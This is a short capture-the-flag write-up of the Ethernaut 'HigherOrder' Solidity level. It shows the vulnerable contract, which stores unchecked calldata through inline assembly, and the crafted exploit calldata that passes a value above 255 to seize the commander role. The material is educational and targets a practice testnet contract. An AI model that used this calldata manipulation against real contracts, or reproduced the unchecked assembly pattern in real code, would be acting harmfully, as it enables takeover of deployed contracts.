# Calldata, again

This level is kinda similar to **Switch**, in that it too relies on a good handle on calldata and how the elements of calldata are handled by the EVM.

```solidity
contract HigherOrder {
    address public commander;

    uint256 public treasury;

    function registerTreasury(uint8) public {
        assembly {
            sstore(treasury_slot, calldataload(4))
        }
    }

    function claimLeadership() public {
        if (treasury > 255) commander = msg.sender;
        else revert("Only members of the Higher Order can become Commander");
    }
}
```

The entire contract is just this much, and the `assembly` block in `registerTreasury` dumbly gets the calldata after the function sig and stores it at `treasury`'s location.

### The hack

The trick is to get the function sig right so that the function dispatch sends the calldata to the right location, but then have a spurious calldata argument once inside the function body.

`cast sig "registerTreasury(uint8)"` gives the function selector as `0x211c85ab`

`cast calldata "registerTreasury(uint256)" 696969` gives the calldata as `0xe21467e800000000000000000000000000000000000000000000000000000000000aa289`

Replacing the function selector with the right one, we get the calldata:
`0x211c85ab00000000000000000000000000000000000000000000000000000000000aa289`

And I passed in this calldata using the [contract that was deployed](https://sepolia.etherscan.io/address/0x6a86b69deb94fa740e66ace6ec1a0e8105129ce9#code) for Switch. Told you it was general purpose.

Once that's done, all you have to do is `claimLeadership()`.

Thank God Coup d'états aren't this easy in real life.
